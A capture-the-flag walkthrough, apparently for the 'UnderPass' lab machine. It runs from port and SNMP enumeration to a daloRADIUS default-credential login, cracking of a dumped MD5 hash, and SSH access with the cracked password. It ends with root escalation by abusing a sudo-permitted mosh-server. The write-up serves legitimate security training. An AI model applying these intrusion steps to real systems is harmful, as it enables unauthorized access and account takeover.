# UnderPass - Easy

```sh
sudo vim /etc/hosts
# map IP to underpass.htb

nmap -T4 -p- -A -Pn -v underpass.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
    * 80/tcp - http - Apache httpd 2.4.52

* the webpage on port 80 is the Apache2 default landing page

* web scan:

    ```sh
    gobuster dir -u http://underpass.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # simple dir scan

    ffuf -c -u "http://underpass.htb" -H "Host: FUZZ.underpass.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 10671 -s
    # subdomain scan
    ```

* as we did not get a lot of info from open TCP ports, we can check with a quick UDP scan:

    ```sh
    sudo nmap -sU -Pn -v underpass.htb
    ```

* the UDP scan shows that port 161, running SNMP, is open - so we can enumerate SNMP:

    ```sh
    snmpwalk -v2c -c public underpass.htb
    # query SNMP OIDs with 'public' community string
    # this works so we do not need to bruteforce
    ```

* the ```snmpwalk``` queries multiple OIDs, and we get a username 'steve@underpass.htb':

* we also get a couple of strings:

    * "UnDerPass.htb is the only daloradius server in the basin!"
    * "Nevada, U.S.A. but not Vegas"

* Googling for daloradius server leads to [daloRADIUS](https://github.com/lirantal/daloradius), a RADIUS (AAA) web app

* based on the clue, it should be hosted on port 80 in a directory or subdomain

* checking 'http://underpass.htb/daloradius' leads to 403 Forbidden, which means the page exists but we cannot access it

* we can do a quick directory scan to check for any pages in this subdirectory:

    ```sh
    gobuster dir -u http://underpass.htb/daloradius -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    ```

* we get these pages:

    * /app - 403 Forbidden
    * /ChangeLog - this shows the latest release for daloradius is '1.1-3'
    * /contrib - 403 Forbidden
    * /doc - 403 Forbidden

* Googling further based on these subfolders gives us the path '/daloradius/app/operators' - this leads to a page

* navigating to 'http://underpass.htb/daloradius/app/operators/login.php' gives us a login page - the footer mentions 'daloRADIUS 2.2 beta'

* Googling for default creds for this app gives 'administrator:radius' - and this works for the login page

* we get the dashboard view for daloradius - we can enumerate the views for further clues

* in the dashboard view, clicking on 'Users' > 'go to users list' leads to the user listing view

* this provides a username 'svcMosh' and a password hash - hash identifier tools show that it is a MD5 hash

* [crackstation](https://crackstation.net) cracks this MD5 hash to cleartext 'underwaterfriends'

* checking for password re-use, we can attempt to login via SSH for 2 usernames - 'steve' and 'svcMosh':

    ```sh
    ssh steve@underpass.htb
    # this does not work

    ssh svcMosh@underpass.htb
    # this works and we are able to login

    ls -la

    cat user.txt
    # user flag

    ls -la /home
    # there is no 'steve', only 'svcMosh' on this box

    sudo -l
    # this shows we can run '/usr/bin/mosh-server' as root
    ```

* checking more on this ```mosh-server``` program shows that it is a 'mobile shell' - a remote terminal app for mobile devices

* we can check more about this binary by running it and checking for related files:

    ```sh
    ls -la /usr/bin/mosh*
    # this has multiple files

    /usr/bin/mosh
    # this is the main binary

    /usr/bin/mosh-client
    # this is the client build
    # requires IP and port details for connection

    /usr/bin/mosh-server
    # this is for the client to connect to, over port 60001
    # it is detached as there is no client
    ```

* ```mosh-client``` & ```mosh-server``` show that it is running on build 1.3.2 - Googling for exploits related to this version do not give anything

* since we can run ```mosh-server``` as root, we need to check if it offers any other functions:

    ```sh
    /usr/bin/mosh-server --help

    sudo /usr/bin/mosh-server
    # this is using port 60001
    # and it gets detached

    /usr/bin/mosh-client 127.0.0.1 60001
    # this requires a 'MOSH_KEY' env var
    ```

* Googling about this shows that ```mosh-server``` outputs the port number and a string - which is supposed to be the 'MOSH_KEY' value

* as we can run ```mosh-server``` as sudo, we can run this in one SSH session, and run ```mosh-client``` to connect to this in another SSH session:

    ```sh
    # on attacker, open a new SSH session
    ssh svcMosh@underpass.htb
    ```

    ```sh
    # in the first SSH session
    sudo /usr/bin/mosh-server
    # copy the key given here
    ```

    ```sh
    # in the second SSH session

    # create env var
    export MOSH_KEY="sXALOItVxBmku9XnQgSSTA"

    /usr/bin/mosh-client 127.0.0.1 60001
    # this works and we get root shell

    cat /root/root.txt
    # root flag

    # only thing to note here is that if we do not use the key quickly, it expires and the session fails to connect
    ```
